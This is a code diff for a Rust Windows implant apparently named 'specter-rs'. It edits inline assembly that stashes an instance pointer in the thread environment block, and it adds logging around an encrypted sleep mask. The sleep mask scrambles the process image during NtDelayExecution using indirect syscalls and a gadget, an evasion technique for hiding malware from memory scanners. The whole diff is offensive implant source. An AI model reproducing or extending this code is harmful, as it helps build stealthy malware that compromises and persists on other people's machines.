@@ -122,13 +122,15 @@ pub unsafe fn get_peb() -> *mut Peb {
 /// stack frame never returns, so an instance owned by `spt_main` is valid.
 #[inline]
 pub unsafe fn store_instance(instance: *mut Instance) {
+    let tmp: usize;
     core::arch::asm!(
-        "mov rcx, gs:[0x30]",
-        "mov qword ptr [rcx + 0x28], {}",
-        in(reg) instance,
-        lateout("rcx") _,
+        "mov {tmp}, gs:[0x30]",
+        "mov qword ptr [{tmp} + 0x28], {instance}",
+        instance = in(reg) instance,
+        tmp = out(reg) tmp,
         options(nostack),
     );
+    core::hint::black_box(tmp);
 }
 
 /// Recover the instance from the TEB (port of the `G_INSTANCE` macro).
@@ -138,14 +140,16 @@ pub unsafe fn store_instance(instance: *mut Instance) {
 /// Only after `store_instance` ran on this thread.
 #[inline]
 pub unsafe fn instance() -> *mut Instance {
+    let tmp: usize;
     let inst: *mut Instance;
     core::arch::asm!(
-        "mov rcx, gs:[0x30]",
-        "mov {}, qword ptr [rcx + 0x28]",
-        out(reg) inst,
-        lateout("rcx") _,
+        "mov {tmp}, gs:[0x30]",
+        "mov {inst}, qword ptr [{tmp} + 0x28]",
+        inst = out(reg) inst,
+        tmp = out(reg) tmp,
         options(nostack, preserves_flags),
     );
+    core::hint::black_box(tmp);
     inst
 }
 
@@ -682,6 +686,7 @@ pub unsafe fn main() -> ! {
         },
     };
     store_instance(&mut instance);
+    crate::runtime::debug::register_crash_logger(instance.ntdll);
     crate::runtime::debug::log(&instance, b"specter-rs: bootstrap ok\n");
     stage_gate(12);
 
@@ -710,13 +715,27 @@ pub unsafe fn main() -> ! {
         let delay_ssn = instance.syscalls.delay_ssn;
         let seed = instance.rng.next_u64();
 
-        if let Some(ref mut mask) = instance.sleep_mask {
+        if instance.sleep_mask.is_some() {
             // Encrypted sleep: the whole image goes through the keystream
-            // while the thread is inside NtDelayExecution.
+            // while the thread is inside NtDelayExecution. The per-cycle
+            // fields refresh first, then the stub runs alone.
+            crate::runtime::debug::log(&instance, b"sm: enter\n");
+        }
+        if let Some(ref mut mask) = instance.sleep_mask {
             mask.seed = seed;
             mask.gadget = gadget as usize;
             mask.interval = interval;
             crate::runtime::sleepmask::spt_sleepmask(core::ptr::from_ref(mask) as usize);
+            // A failed flip leaves its range untouched (the stub never
+            // writes to a page it could not make writable): the sleep was
+            // plain, say so instead of crashing.
+            let f1 = mask.flip1_status;
+            let f2 = mask.flip2_status;
+            if f1 != 0 || f2 != 0 {
+                crate::runtime::debug::log(&instance, b"sm: flip fail\n");
+            } else {
+                crate::runtime::debug::log(&instance, b"sm: flips ok\n");
+            }
         } else {
             // Plain indirect sleep (mask discovery failed).
             let mut interval = interval;
